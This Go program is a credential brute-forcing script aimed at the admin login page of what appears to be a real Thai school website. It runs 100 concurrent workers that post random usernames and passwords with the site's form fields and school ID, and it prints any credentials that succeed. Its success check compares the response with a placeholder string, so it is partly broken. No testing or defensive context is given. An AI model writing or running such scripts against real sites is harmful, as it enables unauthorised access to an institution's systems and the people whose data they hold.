package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"sync"
	"time"
)

const (
	numRequests = 1000
	concurrency = 100
)

// Generate a random string of given length
func randomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var result []byte
	for i := 0; i < length; i++ {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result = append(result, charset[num.Int64()])
	}
	return string(result), nil
}

// Attempt to login with random credentials
func tryLogin(id int, requestCount *int, requestCountMutex *sync.Mutex, results chan<- string) {
	url := "http://www.mdsr.ac.th/admin_School/index.php"

	for {
		username, _ := randomString(8)
		password, _ := randomString(8)

		body := fmt.Sprintf("loginname=%s&password=%s&school_id=11100254&Action=Login&bt_login=%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A", username, password)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
		if err != nil {
			fmt.Println("Error creating request:", err)
			continue
		}

		req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		req.Header.Set("accept-language", "th-TH,th;q=0.9,en;q=0.8")
		req.Header.Set("cache-control", "max-age=0")
		req.Header.Set("content-type", "application/x-www-form-urlencoded")
		req.Header.Set("upgrade-insecure-requests", "1")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			continue
		}
		defer resp.Body.Close()

		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		if resp.StatusCode == http.StatusOK {
			// Check the response body for success indication
			if string(bodyBytes) == "expected response body for success" {
				results <- fmt.Sprintf("Found valid credentials!\nUsername: %s\nPassword: %s\n", username, password)
				return
			}
		}

		// Update request count
		requestCountMutex.Lock()
		*requestCount++
		requestCountMutex.Unlock()

		if *requestCount >= numRequests {
			return
		}

		time.Sleep(100 * time.Millisecond) // Avoid hammering the server too quickly
	}
}

func main() {
	results := make(chan string)
	var requestCount int
	var requestCountMutex sync.Mutex

	for i := 0; i < concurrency; i++ {
		go tryLogin(i, &requestCount, &requestCountMutex, results)
	}

	for {
		select {
		case result := <-results:
			fmt.Println(result)
			// Optionally, you can decide to exit after finding a valid credential
			// return
		case <-time.After(10 * time.Minute): // Timeout if desired
			fmt.Println("Timeout reached or completed.")
			return
		}

		if requestCount >= numRequests {
			fmt.Println("Completed all requests.")
			return
		}
	}
}
